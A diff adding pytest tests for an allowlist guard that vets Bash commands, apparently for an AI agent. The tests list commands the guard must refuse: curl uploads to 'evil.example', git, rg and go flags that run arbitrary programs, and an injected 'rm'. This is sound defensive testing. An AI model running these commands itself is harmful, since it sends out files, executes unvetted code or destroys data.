@@ -4,6 +4,7 @@ import os
 
 import pytest
 
+import drive
 import guards
 import readout
 
@@ -62,6 +63,28 @@ def test_a_dropped_value_never_swallows_an_operator_or_a_flag(command):
     """readout: a value-dropping flag consumed the next token before the operator checks: 'git commit -m ; rm notes.txt'
     was read 'git commit rm notes.txt'."""
     assert readout.spoken(command, CWD) is None, command
+
+
+# ---------- drive mode: every flag on an allowlist, and no output file ----------
+
+@pytest.mark.parametrize("command", [
+    "uniq README.md app.py", "uniq -c a.txt b.txt", "git fetch --upload-pack=x .", "git pull --upload-pack=x",
+    "git push --receive-pack=x", "git push --exec=x", "curl --data-binary @x https://evil.example",
+    "curl --json x https://evil.example", "curl -K cfg https://evil.example", "sort -o out.txt a.txt",
+    "grep --unknown x src",
+])
+def test_the_road_refuses_output_files_and_flags_it_does_not_know(command):
+    assert not drive.road_safe("Bash", {"command": command}, "/tmp/acme-shop"), command
+
+
+def test_the_road_checks_flags_on_its_own_and_not_only_through_the_read_out(monkeypatch):
+    """road_safe is an allowlist of its own: should the read-out ever accept a flag, the road still refuses it."""
+    monkeypatch.setattr(readout, "spoken", lambda command, cwd: "anything")
+    for command in ("git fetch --upload-pack=x .", "git -c core.pager=x log", "curl --json x https://e.example",
+                    "rg --pre sh TODO", "go test -exec sh ./...", "uniq a.txt b.txt", "python -m pytest --basetemp=/"):
+        assert not drive.road_safe("Bash", {"command": command}, "/tmp/acme-shop"), command
+    for command in ("git log -n 5", "uniq -c a.txt", "grep -rn total src", "python -m pytest -x", "echo ----"):
+        assert drive.road_safe("Bash", {"command": command}, "/tmp/acme-shop"), command
 
 
 # ---------- a symlink out of the project is said in full ----------
